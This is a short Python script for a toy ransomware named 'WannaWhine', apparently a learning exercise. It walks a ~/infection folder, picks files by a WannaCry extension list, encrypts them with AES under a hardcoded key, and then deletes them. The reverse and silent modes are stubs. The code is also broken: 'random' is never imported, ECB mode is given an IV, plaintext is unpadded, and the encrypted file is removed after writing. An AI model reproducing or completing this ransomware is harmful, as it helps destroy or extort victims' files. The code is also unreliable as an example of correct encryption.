import argparse
import os
from Crypto.Cipher import AES #pip

RANSOM = os.environ["HOME"] + '/infection/'
KEY = 'v8y/B?E(H+MbQeTh'

def parse_args():
	parser = argparse.ArgumentParser(prog='WannaWhine', description='Small Ransomware', epilog='Do evil for educational purposes. Made by: cruiz-de')
	parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0', help='Displays programs version number.')
	parser.add_argument('-r', '--reverse', action='store_true', help='Decreypts the encrypted files.')
	parser.add_argument('-s', '--silent', action='store_true', help='Silent mode.')
	args = parser.parse_args()
	return args

def check_infection() -> bool:
	if os.path.isdir('/home/' + os.getlogin() + '/infection'):
		return True
	else:
		return False

def check_file_extension(file):
	with open('wannacry_file_extensions.txt', 'r') as ext:
		for line in ext:
			if file.endswith(line.strip()):
				return True
		return False

#def loop_file():
#	for root, dirs, files in os.walk(RANSOM):
#		for filename in files:
#			print(check_file_extension(filename))
#		#for dirname in dirs:
#			#print(os.path.join(root, dirname))

def encrypt_data(data):
	initialization_vector = ''.join([chr(random.randint(0, 0xFF)) for i in range(16)])
	aes = AES.new(KEY, AES.MODE_ECB, initialization_vector)
	ciphertext = aes.encrypt(data)
	return ciphertext

def encrypt(args):
	for root, dirs, files in os.walk(RANSOM):
		for filename in files:
			if check_file_extension(filename):
				with open(RANSOM + filename, 'r') as f:
					data = f.read()
					with open(RANSOM + filename, 'w') as f:
						f.write(encrypt_data(data))
						f.close()
					f.close()
					os.remove(RANSOM + filename)
					print('[+] ' + filename + ' encrypted.')
			else:
				print('[-] ' + filename + ' not encrypted.')


if __name__ == '__main__':
	args = parse_args()
	if check_infection():
		if args.reverse:
			print('reverse')
		elif args.silent:
			print('silent')
		else:
			encrypt(args)